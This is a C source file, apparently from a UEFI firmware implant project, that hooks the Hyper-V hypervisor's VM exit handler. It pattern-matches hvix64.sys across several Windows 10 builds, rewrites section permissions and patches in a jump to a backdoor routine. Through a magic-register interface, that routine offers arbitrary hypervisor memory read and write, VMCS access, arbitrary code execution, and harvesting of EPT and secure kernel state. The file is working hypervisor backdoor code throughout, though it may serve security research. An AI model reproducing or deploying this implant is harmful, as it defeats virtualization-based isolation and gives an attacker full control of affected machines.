#include <PiPei.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../backdoor_client/vmx.h"
#include "../backdoor_client/hyper_v.h"
#include "../backdoor_client/backdoor_client.h"

#include "common.h"
#include "peimage.h"
#include "debug.h"
#include "std.h"

#pragma warning(disable: 4054)

/*
    Guest state saved by VM exit handler of hvix64.sys:

        ...

        .text:FFFFF8000023A12F      mov     [rcx], rax
        .text:FFFFF8000023A132      mov     [rcx+8], rcx
        .text:FFFFF8000023A136      mov     [rcx+10h], rdx
        .text:FFFFF8000023A13A      mov     [rcx+18h], rbx
        .text:FFFFF8000023A13E      mov     [rcx+28h], rbp
        .text:FFFFF8000023A142      mov     [rcx+30h], rsi
        .text:FFFFF8000023A146      mov     [rcx+38h], rdi
        .text:FFFFF8000023A14A      mov     [rcx+40h], r8
        .text:FFFFF8000023A14E      mov     [rcx+48h], r9
        .text:FFFFF8000023A152      mov     [rcx+50h], r10
        .text:FFFFF8000023A156      mov     [rcx+58h], r11
        .text:FFFFF8000023A15A      mov     [rcx+60h], r12
        .text:FFFFF8000023A15E      mov     [rcx+68h], r13
        .text:FFFFF8000023A162      mov     [rcx+70h], r14
        .text:FFFFF8000023A166      mov     [rcx+78h], r15

        ...
*/
typedef struct _VM_GUEST_STATE
{
    UINT64 Rax;
    UINT64 Rcx;
    UINT64 Rdx;
    UINT64 Rbx;
    UINT64 Rsp;
    UINT64 Rbp;
    UINT64 Rsi;
    UINT64 Rdi;
    UINT64 R8;
    UINT64 R9;
    UINT64 R10;
    UINT64 R11;
    UINT64 R12;
    UINT64 R13;
    UINT64 R14;
    UINT64 R15;

} VM_GUEST_STATE,
*PVM_GUEST_STATE;

/* 
    Flags values
*/
#define HVBD_F_COLLECT_EPT  0x01 // collect EPT information
#define HVBD_F_COLLECT_SK   0x02 // collect secure kernel information

// backdoor global data
typedef struct _HVBD_DATA
{    
    UINT64 Flags;
    UINT64 SkCallCount;
    UINT64 VmCallCount;
    UINT64 VmExitCount;
    UINT64 VmExitHandler;
    UINTN Version;
    EPT_INFO EptInfo[EPT_MAX_COUNT];
    SK_INFO SkInfo[SK_MAX_COUNT];

} HVBD_DATA,
*PHVBD_DATA;

// offset of the HVBD_DATA 
#define HVBD_DATA_ADDR (PAGE_SIZE - sizeof(HVBD_DATA))

typedef UINT64 (__stdcall * EXECUTE_FUNC)(UINT64 Arg0, UINT64 Arg1);
//--------------------------------------------------------------------------------------
VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
{
    // 2-nd argument is pointer to the backdoor section
    PHVBD_DATA BackdoorData = (PHVBD_DATA)((UINT8 *)arg_2 + HVBD_DATA_ADDR);
    
    UINT64 ExitReason = 0;
    VM_GUEST_STATE *Context = NULL;

    if (BackdoorData->Version >= 1809)
    {
        // 1-st argument is address of guest saved state pointer
        Context = *(VM_GUEST_STATE **)arg_1;        
    }
    else
    {
        // 1-st argument is guest saved state pointer
        Context = (VM_GUEST_STATE *)arg_1;
    }

    // read VM exit reason
    __vmx_vmread(VM_EXIT_REASON, &ExitReason);

    // check for request from the client
    if (Context->R10 == HVBD_VM_EXIT_MAGIC)
    {        
        EFI_STATUS Status = EFI_INVALID_PARAMETER;        

        UINT64 Code = Context->R11;
        UINT64 *Arg0 = &Context->R12;
        UINT64 *Arg1 = &Context->R13;
        UINT64 *Arg2 = &Context->R14;

        if (Code == HVBD_C_INFO)
        {
            // return hypervisor CR0, CR3 and CR4 values
            *Arg0 = __readcr0();
            *Arg1 = __readcr3();
            *Arg2 = __readcr4();

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INFO_EX)
        {
            *Arg0 = *Arg1 = 0;

            // return hypervisor IDTR
            __sidt(Arg0);

            // return hypervisor GS segment base
            *Arg2 = __readgsqword(0);        

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INFO_EX2)
        {
            // return VM exit handler information                        
            *Arg0 = BackdoorData->VmExitHandler; 
            *Arg1 = BackdoorData->VmExitCount; 
            *Arg2 = BackdoorData->VmCallCount;  

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VIRT_READ)
        {
            // read virtual memory qword
            *Arg1 = *(UINT64 *)*Arg0;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VIRT_WRITE)
        {
            // write virtual memory qword
            *(UINT64 *)*Arg0 = *Arg1;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VMREAD)
        {
            // read VMCS value
            __vmx_vmread(*Arg0, Arg1);

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VMWRITE)
        {
            // write VMCS value
            __vmx_vmwrite(*Arg0, *Arg1);

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_EPT_GET_START)
        {
            __stosb(&BackdoorData->EptInfo, 0xff, EPT_MAX_COUNT * sizeof(EPT_INFO));

            // enable EPT info harvesting
            BackdoorData->Flags |= HVBD_F_COLLECT_EPT;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_EPT_GET_STOP)
        {
            // return EPT list address and size
            *Arg0 = (UINT64)&BackdoorData->EptInfo;
            *Arg1 = EPT_MAX_COUNT;

            // disable EPT harvesting
            BackdoorData->Flags &= ~HVBD_F_COLLECT_EPT;
                
            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_SK_GET_START)
        {
            __stosb(&BackdoorData->SkInfo, 0xff, SK_MAX_COUNT * sizeof(SK_INFO));

            // enable secure kernel info harvesting
            BackdoorData->Flags |= HVBD_F_COLLECT_SK;
            BackdoorData->SkCallCount = 0;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_SK_GET_STOP)
        {
            // return secure kernel info list address and size
            *Arg0 = (UINT64)&BackdoorData->SkInfo;
            *Arg1 = SK_MAX_COUNT;
            *Arg2 = BackdoorData->SkCallCount;

            // disable EPT harvesting
            BackdoorData->Flags &= ~HVBD_F_COLLECT_SK;
                
            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INVL_CACHES)
        {
            // invalidate processor caches
            __wbinvd();

            // flush TLB
            __writecr3(__readcr3());

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_GET_VMCS)
        {
            *Arg0 = *Arg1 = *Arg2 = 0;

            // read current VMCS address
            __vmx_vmptrst(Arg0);

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_EXECUTE)
        {
            EXECUTE_FUNC Func = (EXECUTE_FUNC)(*Arg2);            

            // execute arbitrary code
            *Arg2 = 0;
            *Arg2 = Func(*Arg0, *Arg1);

            Status = EFI_SUCCESS;
        }

        // report status code to the client
        Context->R10 = Status;
    }

    if (BackdoorData->Flags & HVBD_F_COLLECT_EPT)
    {
        UINTN i = 0;
        UINT64 EptAddr = 0;

        // read EPT address from the current VMCS
        __vmx_vmread(EPT_POINTER, &EptAddr);

        // find EPT list free entry
        for (i = 0; i < EPT_MAX_COUNT; i += 1)
        {
            EPT_INFO *Entry = &BackdoorData->EptInfo[i];

            if (Entry->Addr == EPT_NONE)
            {
                Entry->Addr = EptAddr;

                // read VPID from the current VMCS
                __vmx_vmread(0, &Entry->Vpid);

                break;   
            }
            else if (Entry->Addr == EptAddr)
            {
                // entry already exists
                break;
            }
        }
    }

    // check for VTL1 -> VTL0 return VM exit event
    if ((BackdoorData->Flags & HVBD_F_COLLECT_SK) &&
        ExitReason == VM_EXIT_VMCALL && Context->Rcx == HvCallVtlReturn)
    {
        UINTN i = 0;
        UINT64 Rip = 0, Cr3 = 0, EptAddr = 0;  

        // read VMCS fields
        __vmx_vmread(GUEST_RIP, &Rip);
        __vmx_vmread(GUEST_CR3, &Cr3);                    
        __vmx_vmread(EPT_POINTER, &EptAddr);

        // find secure kernel info list free entry
        for (i = 0; i < SK_MAX_COUNT; i += 1)
        {
            SK_INFO *Entry = &BackdoorData->SkInfo[i];

            if (Entry->Rip == SK_NONE)
            {
                Entry->Rip = Rip;
                Entry->Cr3 = Cr3;
                Entry->EptAddr = EptAddr;

                __vmx_vmread(GUEST_IDTR_BASE, &Entry->IdtAddr);
                __vmx_vmread(GUEST_GDTR_BASE, &Entry->GdtAddr);
                
                break;   
            }
            else if (Entry->Rip == Rip && Entry->Cr3 == Cr3 && Entry->EptAddr == EptAddr)
            {
                // entry already exists
                break;
            }
        }

        BackdoorData->SkCallCount += 1;
    }

    if (ExitReason == VM_EXIT_VMCALL)
    {
        BackdoorData->VmCallCount += 1;        
    }

    BackdoorData->VmExitCount += 1;
}

VOID *HyperVBackdoorEnd(VOID)
{
    return (VOID *)&HyperVBackdoor;
}
//--------------------------------------------------------------------------------------
UINT8 RegPush[] = 
{
    0x50,                                       // push   rax
    0x51,                                       // push   rcx
    0x52,                                       // push   rdx
    0x53,                                       // push   rbx
    0x56,                                       // push   rsi
    0x57,                                       // push   rdi
    0x55,                                       // push   rbp
    0x41, 0x50,                                 // push   r8
    0x41, 0x51,                                 // push   r9
    0x41, 0x52,                                 // push   r10
    0x41, 0x53,                                 // push   r11
    0x41, 0x54,                                 // push   r12
    0x41, 0x55,                                 // push   r13
    0x41, 0x56,                                 // push   r14
    0x41, 0x57,                                 // push   r15
    0xe8, 0x00, 0x00, 0x00, 0x00,               // call   $+5
    0x5a,                                       // pop    rdx
    0x48, 0x81, 0xe2, 0x00, 0xf0, 0xff, 0xff,   // and    rdx, 0xfffffffffffff000
    0x48, 0x83, 0xec, 0x28                      // sub    rsp, 0x28
};

UINT8 RegPop[] = 
{
    0x48, 0x83, 0xc4, 0x28,                     // add    rsp, 0x28
    0x41, 0x5f,                                 // pop    r15
    0x41, 0x5e,                                 // pop    r14
    0x41, 0x5d,                                 // pop    r13
    0x41, 0x5c,                                 // pop    r12
    0x41, 0x5b,                                 // pop    r11
    0x41, 0x5a,                                 // pop    r10
    0x41, 0x59,                                 // pop    r9
    0x41, 0x58,                                 // pop    r8
    0x5d,                                       // pop    rbp
    0x5f,                                       // pop    rdi
    0x5e,                                       // pop    rsi
    0x5b,                                       // pop    rbx
    0x5a,                                       // pop    rdx
    0x59,                                       // pop    rcx
    0x58                                        // pop    rax
};

VOID *HyperVHook(VOID *Image)
{
    VOID *Ret = NULL;
    UINT8 *Buff = NULL;
    UINT32 BuffSize = 0, i = 0;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);

    EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V image is at "FPTR"\r\n", Image);

    // find resources section by name
    for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
    {
        #define SECTION_PERM (EFI_IMAGE_SCN_MEM_READ | EFI_IMAGE_SCN_MEM_WRITE | EFI_IMAGE_SCN_MEM_EXECUTE)

        if (std_strcmp((char *)&pSection->Name, ".rsrc") == 0)
        {
            if (pSection->Characteristics == SECTION_PERM)
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Image is already patched\r\n");
                return NULL;
            }

            Buff = RVATOVA(Image, pSection->VirtualAddress);
            BuffSize = ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);

            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): Resources section RVA is 0x%x (0x%x bytes)\r\n", 
                pSection->VirtualAddress, BuffSize
            );            

            if (BuffSize < PAGE_SIZE || (pSection->VirtualAddress & (PAGE_SIZE - 1)) != 0)
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid address/size\r\n");
                return NULL;   
            }

            // erase section contents
            std_memset(Buff, 0, BuffSize);

            // update section attributes
            pSection->Characteristics = SECTION_PERM;
            pSection->Misc.VirtualSize = BuffSize;
            break;
        }
    }

    if (Buff == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find resources section\r\n");
        return NULL;
    }

    pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

    // find code section by name
    for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
    {
        if (std_strcmp((char *)&pSection->Name, ".text") == 0)
        {
            UINTN Size = 0;

            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): Code section RVA is 0x%x\r\n", 
                pSection->VirtualAddress
            );
            
            while (Size < pSection->Misc.VirtualSize - PAGE_SIZE)
            {
                UINTN Version = 0, HookLen = 0;
                UINT8 *Func = RVATOVA(Image, pSection->VirtualAddress + Size);

                /*
                    Match hvix64.sys VM exit handler signature for Windows 10 1709:

                        .text:FFFFF80000265125      mov     [rsp+arg_20], rcx
                        .text:FFFFF8000026512A      xor     ecx, ecx
                        .text:FFFFF8000026512C      mov     [rsp+arg_28], rcx
                        .text:FFFFF80000265131      mov     rcx, [rsp+arg_18]
                        .text:FFFFF80000265136      mov     [rcx], rax
                        .text:FFFFF80000265139      mov     [rcx+8], rcx
                        
                        ...

                        .text:FFFFF8000026516D      mov     [rcx+78h], r15
                        .text:FFFFF80000265171      mov     rax, [rsp+arg_20]
                        .text:FFFFF80000265176      mov     [rcx+8], rax
                        .text:FFFFF8000026517A      lea     rax, [rcx+100h]

                        ...

                        .text:FFFFF800002651A6      mov     rdx, [rsp+arg_28]
                        .text:FFFFF800002651AB      call    sub_FFFFF80000219B00
                */
                if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
                    *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
                    *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
                    *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
                    *(Func + 0x86) == 0xe8)
                {
                    Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
                    HookLen = 5;
                    Version = 1709;                    
                }
                /*
                    Match hvix64.sys VM exit handler signature for Windows 10 1803:

                        .text:FFFFF8000027A150      mov     [rsp+arg_20], rcx
                        .text:FFFFF8000027A155      xor     ecx, ecx
                        .text:FFFFF8000027A157      mov     [rsp+arg_28], rcx
                        .text:FFFFF8000027A15C      mov     rcx, [rsp+arg_18]
                        .text:FFFFF8000027A161      mov     [rcx], rax
                        .text:FFFFF8000027A164      mov     [rcx+8], rcx
                        
                        ...

                        .text:FFFFF8000027A198      mov     [rcx+78h], r15
                        .text:FFFFF8000027A19C      mov     rax, [rsp+arg_20]
                        .text:FFFFF8000027A1A1      mov     [rcx+8], rax
                        .text:FFFFF8000027A1A5      lea     rax, [rcx+100h]

                        ...

                        .text:FFFFF8000027A222      mov     rdx, [rsp+arg_28]
                        .text:FFFFF8000027A227      call    sub_FFFFF80000219C10

                */
                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
                         *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
                         *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
                         *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
                         *(Func + 0xd7) == 0xe8)
                {
                    Func = (UINT8 *)JUMP32_ADDR(Func + 0xd7);
                    HookLen = 5;
                    Version = 1803;                    
                }
                /*
                    Match hvix64.sys VM exit handler signature for Windows 10 1809:

                        .text:FFFFF8000028B414      mov     [rsp+arg_20], rcx
                        .text:FFFFF8000028B419      mov     rcx, [rsp+arg_18]
                        .text:FFFFF8000028B41E      mov     rcx, [rcx]
                        .text:FFFFF8000028B421      mov     [rcx], rax
                        .text:FFFFF8000028B424      mov     [rcx+10h], rdx
                        
                        ...

                        .text:FFFFF8000028B454      mov     [rcx+78h], r15
                        .text:FFFFF8000028B458      mov     rax, [rsp+arg_20]
                        .text:FFFFF8000028B45D      mov     [rcx+8], rax
                        .text:FFFFF8000028B461      lea     rax, [rcx+70h]

                        ...

                        .text:FFFFF8000028B52D      mov     rdx, [rsp+arg_28]
                        .text:FFFFF8000028B532      call    sub_FFFFF800002174F0
                */
                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 && 
                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
                         *(Func + 0x11e) == 0xe8)
                {
                    Func = (UINT8 *)JUMP32_ADDR(Func + 0x11e);
                    HookLen = 8;
                    Version = 1809;                    
                }
                /*
                    Match hvix64.sys VM exit handler signature for Windows 10 1903 and 1909:

                        .text:FFFFF8000026C39F      mov     [rsp+arg_20], rcx
                        .text:FFFFF8000026C3A4      mov     rcx, [rsp+arg_18]
                        .text:FFFFF8000026C3A9      mov     rcx, [rcx]
                        .text:FFFFF8000026C3AC      mov     [rcx], rax
                        .text:FFFFF8000026C3AF      mov     [rcx+10h], rdx
                        
                        ...

                        .text:FFFFF8000026C3DF      mov     [rcx+78h], r15
                        .text:FFFFF8000026C3E3      mov     rax, [rsp+arg_20]
                        .text:FFFFF8000026C3E8      mov     [rcx+8], rax
                        .text:FFFFF8000026C3EC      lea     rax, [rcx+70h]

                        ...

                        .text:FFFFF8000026C4B2      mov     rdx, [rsp+arg_28]
                        .text:FFFFF8000026C4B7      call    sub_FFFFF80000229F40
                */
                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 && 
                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
                         *(Func + 0x118) == 0xe8)
                {
                    Func = (UINT8 *)JUMP32_ADDR(Func + 0x118);
                    HookLen = 8;
                    Version = 1903;                    
                }
                /*
                    Match hvix64.sys VM exit handler signature for Windows 10 2004:

                        .text:FFFFF80000232372      mov     [rsp+arg_20], rcx
                        .text:FFFFF80000232377      mov     rcx, [rsp+arg_18]
                        .text:FFFFF8000023237C      mov     rcx, [rcx]
                        .text:FFFFF8000023237F      mov     [rcx], rax
                        .text:FFFFF80000232382      mov     [rcx+10h], rdx
                        
                        ...

                        .text:FFFFF800002323B2      mov     [rcx+78h], r15
                        .text:FFFFF800002323B6      mov     rax, [rsp+arg_20]
                        .text:FFFFF800002323BB      mov     [rcx+8], rax
                        .text:FFFFF800002323BF      lea     rax, [rcx+70h]
                        
                        ...

                        .text:FFFFF80000232436      mov     rcx, [rsp+arg_18]
                        .text:FFFFF8000023243B      mov     rdx, [rsp+arg_28]
                        .text:FFFFF80000232440      call    sub_FFFFF8000020E010
                */
                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 && 
                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
                         *(Func + 0xce) == 0xe8)
                {
                    Func = (UINT8 *)JUMP32_ADDR(Func + 0xce);
                    HookLen = 5;
                    Version = 2004;                    
                }
                else
                {
                    Func = NULL;
                }

                if (Func)
                {
                    UINTN Ptr = 0;
                    UINTN CodeLen = (UINTN)&HyperVBackdoorEnd - (UINTN)&HyperVBackdoor;
                    PHVBD_DATA BackdoorData = (PHVBD_DATA)(Buff + HVBD_DATA_ADDR);

                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V VM exit handler is at "FPTR"\r\n", Func);
                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Backdoor code size is %d bytes\r\n", CodeLen);

                    // copy backdoor code
                    std_memcpy(Buff, (VOID *)&HyperVBackdoor, CodeLen);
                    Ptr += CodeLen;

                    // save registers
                    std_memcpy(Buff + Ptr, RegPush, sizeof(RegPush));
                    Ptr += sizeof(RegPush);                    

                    // call of the backdoor code
                    *(Buff + Ptr) = 0xe8;
                    *(UINT32 *)(Buff + Ptr + 1) = JUMP32_OP(Buff + Ptr, Buff);
                    Ptr += JUMP32_LEN;                    

                    // restore registers
                    std_memcpy(Buff + Ptr, RegPop, sizeof(RegPop));
                    Ptr += sizeof(RegPop);

                    // save original bytes of VM exit handler
                    std_memcpy(Buff + Ptr, Func, HookLen);
                    Ptr += HookLen;

                    // jump to the function body
                    *(Buff + Ptr) = 0xe9;
                    *(UINT32 *)(Buff + Ptr + 1) = JUMP32_OP(Buff + Ptr, Func + HookLen);

                    // jump to the handler
                    *Func = 0xe9;
                    *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff + CodeLen);                    

                    // initialize backdoor data
                    BackdoorData->Flags = 0;
                    BackdoorData->SkCallCount = BackdoorData->VmCallCount = BackdoorData->VmExitCount = 0;
                    BackdoorData->VmExitHandler = (UINT64)Func;
                    BackdoorData->Version = Version;

                    Ret = Func;
                    break;
                }

                Size += 1;
            }

            break;
        }
    }       

    if (Ret == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find VM exit handler\r\n");
        return NULL;
    }

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF
